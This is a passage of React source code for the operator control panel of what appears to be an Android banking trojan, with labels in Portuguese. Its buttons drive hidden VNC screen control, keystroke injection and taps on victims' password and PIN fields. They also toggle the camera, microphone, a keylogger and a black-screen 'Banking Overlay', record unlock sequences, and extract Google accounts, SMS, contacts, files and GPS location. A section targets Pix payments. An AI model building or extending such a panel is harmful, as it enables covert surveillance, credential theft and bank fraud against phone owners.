            ['📋', 'CLIPBOARD'],
          ].map(([icon, action]) => (
            <button key={action} onClick={() => nav(action)}
              style={{ padding: '6px 0', fontSize: 14, borderRadius: 8, border: '1px solid var(--gold-border)',
                background: 'var(--bg3)', color: 'var(--gold)', cursor: 'pointer', fontWeight: 700 }}>
              {icon}
            </button>
          ))}
        </div>
      )}

      {/* ── Keyboard capture bar ── */}
      {(showHvnc || showWire) && (
        <div style={{ display: 'flex', gap: 6, marginBottom: 8, alignItems: 'center' }}>
          <button onClick={() => { setKbCapture(p => !p); setTypedBuf(''); }}
            style={{ padding: '6px 12px', fontSize: 10, fontWeight: 800, borderRadius: 8,
              border: `1px solid ${kbCapture ? '#00c864' : 'var(--gold-border)'}`,
              background: kbCapture ? 'rgba(0,200,100,.15)' : 'var(--bg3)',
              color: kbCapture ? '#00c864' : 'var(--text2)', cursor: 'pointer', flexShrink: 0 }}>
            ⌨ {kbCapture ? 'ON' : 'OFF'}
          </button>
          <div style={{ flex: 1, padding: '5px 10px', borderRadius: 8, background: 'var(--bg2)',
            border: `1px solid ${kbCapture ? 'rgba(0,200,100,.4)' : 'var(--gold-border)'}`,
            fontSize: 11, color: kbCapture ? '#00c864' : 'var(--text3)', fontFamily: 'monospace',
            minHeight: 28, display: 'flex', alignItems: 'center' }}>
            {typedBuf || (kbCapture ? '▌ capturando...' : 'teclado desativado')}
          </div>
          {kbCapture && typedBuf && (
            <button onClick={() => { sendCmd('TYPE', { text: typedBuf }); showToast(`⌨ SEND: "${typedBuf}"`); setTypedBuf(''); }}
              style={{ padding: '6px 10px', fontSize: 10, borderRadius: 8, border: 'none',
                background: '#3b7af0', color: '#fff', cursor: 'pointer', fontWeight: 800 }}>
              SEND
            </button>
          )}
        </div>
      )}

      {/* ── Quality / VNC controls ── */}
      {(showHvnc || showWire) && (
        <div style={{ display: 'flex', gap: 6, marginBottom: 10, alignItems: 'center' }}>
          <span style={{ fontSize: 10, color: 'var(--text3)', flexShrink: 0 }}>QUAL</span>
          <input type="range" min={20} max={100} step={5} value={quality}
            onChange={e => setQualityAndSend(+e.target.value)}
            style={{ flex: 1, accentColor: '#3b7af0' }} />
          <span style={{ fontSize: 10, color: '#3b7af0', fontWeight: 700, width: 28, textAlign: 'right' }}>
            {quality}
          </span>
          <button onClick={startVncOnly} style={{ padding: '4px 8px', fontSize: 9, borderRadius: 6,
            border: '1px solid #3b7af0', background: 'transparent', color: '#3b7af0', cursor: 'pointer' }}>
            VNC↺
          </button>
          <button onClick={startSrOnly} style={{ padding: '4px 8px', fontSize: 9, borderRadius: 6,
            border: '1px solid #9060ff', background: 'transparent', color: '#9060ff', cursor: 'pointer' }}>
            SR↺
          </button>
        </div>
      )}

      {/* ── Quick-action nodes ── */}
      {(showHvnc || showWire) && nodes.length > 0 && (
        <div style={{ marginBottom: 10 }}>
          {/* Password fields */}
          {pwdNodes.length > 0 && (
            <div style={{ marginBottom: 6 }}>
              <div style={{ fontSize: 9, color: '#FF2A5A', fontWeight: 800, letterSpacing: 1, marginBottom: 3 }}>
                🔑 CAMPOS SENHA ({pwdNodes.length})
              </div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
                {pwdNodes.map((n, i) => (
                  <button key={i} onClick={() => {
                    if (n.bounds) {
                      sendCmd('TAP', { x: Math.round(n.bounds.x + n.bounds.w/2), y: Math.round(n.bounds.y + n.bounds.h/2) });
                      showToast('🔑 TAP SENHA');
                    }
                  }} style={{ padding: '3px 8px', fontSize: 10, borderRadius: 6,
                    border: '1px solid #FF2A5A', background: 'rgba(255,42,90,.12)',
                    color: '#FF2A5A', cursor: 'pointer' }}>
                    {n.hint || n.id?.split('/').pop() || `campo ${i+1}`}
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* PIN digits */}
          {pinNodes.length > 0 && (
            <div style={{ marginBottom: 6 }}>
              <div style={{ fontSize: 9, color: '#FF8C00', fontWeight: 800, letterSpacing: 1, marginBottom: 3 }}>
                🔢 PIN PAD ({pinNodes.length})
              </div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
                {pinNodes.map((n, i) => (
                  <button key={i} onClick={() => {
                    if (n.bounds) sendCmd('TAP', { x: Math.round(n.bounds.x + n.bounds.w/2), y: Math.round(n.bounds.y + n.bounds.h/2) });
                  }} style={{ padding: '3px 10px', fontSize: 12, fontWeight: 800, borderRadius: 6,
                    border: '1px solid #FF8C00', background: 'rgba(255,140,0,.18)',
                    color: '#FF8C00', cursor: 'pointer', minWidth: 36, textAlign: 'center' }}>
                    {n.text}
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Clickable elements */}
          {clickNodes.length > 0 && clickNodes.length <= 20 && (
            <div style={{ marginBottom: 6 }}>
              <div style={{ fontSize: 9, color: '#3b7af0', fontWeight: 800, letterSpacing: 1, marginBottom: 3 }}>
                ⚡ ELEMENTOS CLICÁVEIS ({clickNodes.length})
              </div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
                {clickNodes.slice(0, 16).map((n, i) => (
                  <button key={i} onClick={() => {
                    if (n.bounds) {
                      sendCmd('TAP', { x: Math.round(n.bounds.x + n.bounds.w/2), y: Math.round(n.bounds.y + n.bounds.h/2) });
                      showToast(`⚡ TAP → ${n.text}`);
                    }
                  }} style={{ padding: '3px 8px', fontSize: 10, borderRadius: 6,
                    border: '1px solid rgba(59,122,240,.5)', background: 'rgba(59,122,240,.12)',
                    color: '#90b8ff', cursor: 'pointer', maxWidth: 120, overflow: 'hidden',
                    textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                    {n.text.slice(0, 18)}
                  </button>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* ── EDITAR V2 control panel ── */}
      {showEdit && (
        <div style={{ marginTop: showHvnc || showWire ? 4 : 0 }}>
          <SectionHdr icon="⚡" label="CONTROLE AO VIVO" />

          <CtrlBtn label="Informações Gerais"    state={null}              onClick={() => sendCmd('GET_DEVICE_INFO')} />
          <CtrlBtn label="Tela ao Vivo (HVNC)"  state={bool(d.vnc_active)} onClick={startVncOnly} />
          <CtrlBtn label="SR V2 Ativo"           state={bool(srOn)}         onClick={() => srOn ? stopAll() : startAll()} />
          <CtrlBtn label="Câmera ao Vivo"        state={bool(d.camera_active)} onClick={() => sendCmd('TOGGLE_CAMERA', { enabled: !d.camera_active })} />
          <CtrlBtn label="Áudio ao Vivo"         state={bool(d.mic_active)} onClick={() => sendCmd('TOGGLE_MICROPHONE', { enabled: !d.mic_active })} />
          <CtrlBtn label="Keylogger"             state={bool(d.keylogger_active)} onClick={() => sendCmd('TOGGLE_KEYLOGGER', { enabled: !d.keylogger_active })} />
          <CtrlBtn label="Banking Overlay"       state={bool(d.black_screen_active)} onClick={() => sendCmd(d.black_screen_active ? 'BLACK_SCREEN_OFF' : 'BLACK_SCREEN_ON')} />
          <CtrlBtn label="Admin & Lock"          state={bool(d.admin_active)} onClick={() => { sendCmd('CHECK_ADMIN_STATUS'); sendCmd('REQUEST_HIERARCHY'); setMode('HVNC'); }} />
          <CtrlBtn label="Desbloqueio"           state={null}              onClick={() => sendCmd('START_UNLOCK_RECORDING')} />

          <SectionHdr icon="📁" label="EXTRAÇÃO DE DADOS" />
          <CtrlBtn label="Contas Google"    onClick={() => sendCmd('GET_ACCOUNTS')} />
          <CtrlBtn label="Gerenciador de Arquivos" onClick={() => sendCmd('FILE_LIST', { path: '/sdcard' })} />
          <CtrlBtn label="SMS"             onClick={() => sendCmd('GET_SMS')} />
          <CtrlBtn label="Contatos"        onClick={() => sendCmd('GET_CONTACTS')} />
          <CtrlBtn label="Aplicativos"     onClick={() => sendCmd('GET_INSTALLED_APPS')} />
          <CtrlBtn label="Localização GPS" onClick={() => sendCmd('GET_LOCATION')} />

          <SectionHdr icon="💰" label="FINANCEIRO" />
          <CtrlBtn label="Pix & Captura" onClick={() => { sendCmd('REQUEST_HIERARCHY'); setMode('HVNC'); }} />
          <CtrlBtn label="Sequências de Desbloqueio" onClick={() => sendCmd('START_UNLOCK_RECORDING')} />

          {/* Battery */}
          <div style={{ background: 'rgba(30,20,5,.8)', border: '1px solid var(--gold-border)',
            borderRadius: 10, padding: '8px 14px', marginBottom: 6 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 4 }}>
              <span style={{ fontSize: 10, fontWeight: 700, color: 'var(--gold)' }}>ENERGIA</span>
              <span style={{ marginLeft: 'auto', fontSize: 12, fontWeight: 700,
                color: (d.battery_level || 0) > 20 ? '#00c864' : '#ff5c80' }}>
                {d.battery_level || 0}%
              </span>
              {d.is_charging && <span style={{ fontSize: 14, color: '#f0b030' }}>⚡</span>}
            </div>
            <div style={{ height: 3, background: 'var(--bg3)', borderRadius: 2 }}>
              <div style={{ height: '100%', borderRadius: 2, transition: 'width .4s',
                background: (d.battery_level||0) > 20 ? '#00c864' : '#ff5c80',
                width: `${d.battery_level||0}%` }} />
            </div>
          </div>
        </div>
      )}

      {/* ── Stats row ── */}
      <div style={{ display: 'flex', gap: 6, marginTop: 4, flexWrap: 'wrap' }}>
        {[
          [`📱 ${curPkg.split('.').slice(-1)[0] || '—'}`, 'var(--text3)'],
          [`🌐 ${d.sdk ? 'API '+d.sdk : '—'}`,           '#9060ff'],
          [`⌂ ${d.model || '—'}`,                        'var(--text3)'],
          [`📶 ${d.network_type || '—'}`,                '#00C8FF'],
        ].map(([label, color]) => (
          <span key={label} style={{ fontSize: 9, padding: '2px 7px', borderRadius: 5,
            background: 'var(--bg3)', color, fontWeight: 600 }}>
            {label}
          </span>
        ))}
      </div>
    </div>
  );
}

// ── Mini helper components ─────────────────────────────────────────────────────
const bool = v => v ? 'true' : 'false';

function SectionHdr({ icon, label }) {
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 6, margin: '12px 0 6px' }}>
      <span style={{ fontSize: 13 }}>{icon}</span>
      <span style={{ fontSize: 10, fontWeight: 800, color: 'var(--gold)', letterSpacing: 1 }}>{label}</span>
      <div style={{ flex: 1, height: 1, background: 'var(--gold-border)' }} />
    </div>
  );
}

function CtrlBtn({ label, state, onClick }) {
  return (
    <div onClick={onClick} style={{ background: 'rgba(30,20,5,.8)',
      border: '1px solid var(--gold-border)', borderRadius: 10,
      padding: '8px 14px', marginBottom: 6, cursor: 'pointer',
      display: 'flex', alignItems: 'center', gap: 8 }}>
      {state != null && (
        <span style={{ fontSize: 9, padding: '1px 6px', borderRadius: 4,
          background: state === 'true' ? 'rgba(0,200,100,.15)' : 'var(--bg3)',
          color: state === 'true' ? '#00c864' : 'var(--text3)', fontWeight: 600 }}>
          {state}
        </span>
      )}
      <span style={{ fontSize: 11, fontWeight: 700, color: 'var(--gold)', letterSpacing: .5 }}>{label}</span>
      <span style={{ marginLeft: 'auto', fontSize: 12, color: 'var(--text3)' }}>›</span>
    </div>
  );
}
